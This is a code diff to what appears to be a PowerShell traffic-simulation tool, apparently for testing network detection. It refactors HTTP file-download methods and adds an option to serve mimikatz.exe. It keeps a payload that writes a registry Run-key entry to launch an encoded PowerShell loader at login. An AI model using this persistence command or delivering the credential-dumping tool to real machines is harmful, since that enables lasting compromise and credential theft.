@@ -2267,20 +2267,23 @@ class IptgenHttpFileDownload : IptgenBase {
         }
     }
 
-    [void]DownloadCorvette(
+    hidden [void]DownloadFile(
         [Microsoft.Management.Infrastructure.CimInstance]$interface,
         [string]$client_ip,
-        [string]$server_ip
+        [string]$server_ip,
+        [string]$request_path,
+        [string]$response_content_type,
+        [byte[]]$response_body
     ) {
-        $script_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($this.props.my_script))
+        $response_body_64 = [Convert]::ToBase64String($response_body)
         $iptgen_json_data = [IO.File]::ReadAllText($this.iptgen_json)
-        $iptgen_json_data = $iptgen_json_data.Replace('${response_body_b64}', $script_b64)
+        $iptgen_json_data = $iptgen_json_data.Replace('${response_body_b64}', $response_body_64)
         $iptgen_json_path = $this.iptgen_json + ".tmp"
 
         $Env:client_ip = $client_ip
         $Env:server_ip = $server_ip
-        $Env:request_path = "/corvette.ps1"
-        $Env:response_content_type = "text/plain; charset=utf-8"
+        $Env:request_path = $request_path
+        $Env:response_content_type = $response_content_type
 
         if (AskYesNo "Are you sure you want to run?") {
             [IO.File]::WriteAllText($iptgen_json_path, $iptgen_json_data)
@@ -2293,31 +2296,55 @@ class IptgenHttpFileDownload : IptgenBase {
         }
     }
 
+    [void]DownloadCorvette(
+        [Microsoft.Management.Infrastructure.CimInstance]$interface,
+        [string]$client_ip,
+        [string]$server_ip
+    ) {
+        $this.DownloadFile(
+            $interface,
+            $client_ip,
+            $server_ip,
+            "/corvette.ps1",
+            "text/plain; charset=utf-8",
+            [Text.Encoding]::UTF8.GetBytes($this.props.my_script)
+        )
+    }
+
     [void]DownloadCorvettePersistenceScript(
         [Microsoft.Management.Infrastructure.CimInstance]$interface,
         [string]$client_ip,
         [string]$server_ip
     ) {
-        $body_data = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
-        $body_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($body_data))
-        $iptgen_json_data = [IO.File]::ReadAllText($this.iptgen_json)
-        $iptgen_json_data = $iptgen_json_data.Replace('${response_body_b64}', $body_b64)
-        $iptgen_json_path = $this.iptgen_json + ".tmp"
+        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
 
-        $Env:client_ip = $client_ip
-        $Env:server_ip = $server_ip
-        $Env:request_path = "/corvette-ps.ps1"
-        $Env:response_content_type = "text/plain; charset=utf-8"
+        $this.DownloadFile(
+            $interface,
+            $client_ip,
+            $server_ip,
+            "/corvette-ps.ps1",
+            "text/plain; charset=utf-8",
+            [Text.Encoding]::UTF8.GetBytes($body_text)
+        )
+    }
 
-        if (AskYesNo "Are you sure you want to run?") {
-            [IO.File]::WriteAllText($iptgen_json_path, $iptgen_json_data)
-
-            $response_interval = 10
-            if ($this.https) {
-                $response_interval = 0
-            }
-            $this.Run($interface.InterfaceAlias, $iptgen_json_path, $response_interval)
-        }
+    [void]DownloadMimikatz(
+        [Microsoft.Management.Infrastructure.CimInstance]$interface,
+        [string]$client_ip,
+        [string]$server_ip
+    ) {
+        $mimikatz_dir = [SetupTools]::New($this.props).DownloadMimikatz()
+        $mimikatz_name = "mimikatz.exe"
+        $mimikatz_local_path = BuildFullPath $mimikatz_dir $mimikatz_name
+        
+        $this.DownloadFile(
+            $interface,
+            $client_ip,
+            $server_ip,
+            "/" + $mimikatz_name,
+            "application/octet-stream",
+            [IO.File]::ReadAllBytes($mimikatz_local_path)
+        )
     }
 
     [void]Run() {
@@ -2340,6 +2367,7 @@ class IptgenHttpFileDownload : IptgenBase {
             Write-Host "Download File:"
             Write-Host " 1) corvette.ps1"
             Write-Host " 2) corvette persistence-enabling script"
+            Write-Host " 3) mimikatz.exe"
             Write-Host " q) Exit"
             try {
                 :retry do {
@@ -2351,6 +2379,10 @@ class IptgenHttpFileDownload : IptgenBase {
                         }
                         "2" {
                             $this.DownloadCorvettePersistenceScript($interface, $client_ip, $server_ip)
+                            return
+                        }
+                        "3" {
+                            $this.DownloadMimikatz($interface, $client_ip, $server_ip)
                             return
                         }
                         "q" {
@@ -2924,14 +2956,19 @@ class RsgcliHttpFileDownload : RsgcliBase {
         }
     }
 
-    [void]DownloadCorvette([PropsRsgSvr]$rsgsvr) {
-        $script_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($this.props.my_script))
+    hidden [void]DownloadFile(
+        [PropsRsgSvr]$rsgsvr,
+        [string]$request_path,
+        [string]$response_content_type,
+        [byte[]]$response_body
+    ) {
+        $response_body_64 = [Convert]::ToBase64String($response_body)
         $rsgcli_json_data = [IO.File]::ReadAllText($this.rsgcli_json)
-        $rsgcli_json_data = $rsgcli_json_data.Replace('${response_body_b64}', $script_b64)
+        $rsgcli_json_data = $rsgcli_json_data.Replace('${response_body_b64}', $response_body_64)
         $rsgcli_json_path = $this.rsgcli_json + ".tmp"
-        
-        $Env:request_path = "/corvette.ps1"
-        $Env:response_content_type = "text/plain; charset=utf-8"
+
+        $Env:request_path = $request_path
+        $Env:response_content_type = $response_content_type
 
         if (AskYesNo "Are you sure you want to run?") {
             [IO.File]::WriteAllText($rsgcli_json_path, $rsgcli_json_data)
@@ -2939,20 +2976,37 @@ class RsgcliHttpFileDownload : RsgcliBase {
         }
     }
 
-    [void]DownloadCorvettePersistenceScript([PropsRsgSvr]$rsgsvr) {
-        $body_data = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
-        $body_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($body_data))
-        $rsgcli_json_data = [IO.File]::ReadAllText($this.rsgcli_json)
-        $rsgcli_json_data = $rsgcli_json_data.Replace('${response_body_b64}', $body_b64)
-        $rsgcli_json_path = $this.rsgcli_json + ".tmp"
-        
-        $Env:request_path = "/corvette-ps.ps1"
-        $Env:response_content_type = "text/plain; charset=utf-8"
+    [void]DownloadCorvette([PropsRsgSvr]$rsgsvr) {
+        $this.DownloadFile(
+            $rsgsvr,
+            "/corvette.ps1",
+            "text/plain; charset=utf-8",
+            [Text.Encoding]::UTF8.GetBytes($this.props.my_script)
+        )
+    }
 
-        if (AskYesNo "Are you sure you want to run?") {
-            [IO.File]::WriteAllText($rsgcli_json_path, $rsgcli_json_data)
-            $this.Run($rsgsvr.host, $rsgsvr.port, $rsgcli_json_path)
-        }
+    [void]DownloadCorvettePersistenceScript([PropsRsgSvr]$rsgsvr) {
+        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
+
+        $this.DownloadFile(
+            $rsgsvr,
+            "/corvette-ps.ps1",
+            "text/plain; charset=utf-8",
+            [Text.Encoding]::UTF8.GetBytes($body_text)
+        )
+    }
+
+    [void]DownloadMimikatz([PropsRsgSvr]$rsgsvr) {
+        $mimikatz_dir = [SetupTools]::New($this.props).DownloadMimikatz()
+        $mimikatz_name = "mimikatz.exe"
+        $mimikatz_local_path = BuildFullPath $mimikatz_dir $mimikatz_name
+        
+        $this.DownloadFile(
+            $rsgsvr,
+            "/" + $mimikatz_name,
+            "application/octet-stream",
+            [IO.File]::ReadAllBytes($mimikatz_local_path)
+        )
     }
 
     [void]Run() {
@@ -2973,6 +3027,7 @@ class RsgcliHttpFileDownload : RsgcliBase {
             Write-Host "Download File:"
             Write-Host " 1) corvette.ps1"
             Write-Host " 2) corvette persistence-enabling script"
+            Write-Host " 3) mimikatz.exe"
             Write-Host " q) Exit"
             try {
                 :retry do {
@@ -2984,6 +3039,10 @@ class RsgcliHttpFileDownload : RsgcliBase {
                         }
                         "2" {
                             $this.DownloadCorvettePersistenceScript($rsgsvr)
+                            return
+                        }
+                        "3" {
+                            $this.DownloadMimikatz($rsgsvr)
                             return
                         }
                         "q" {
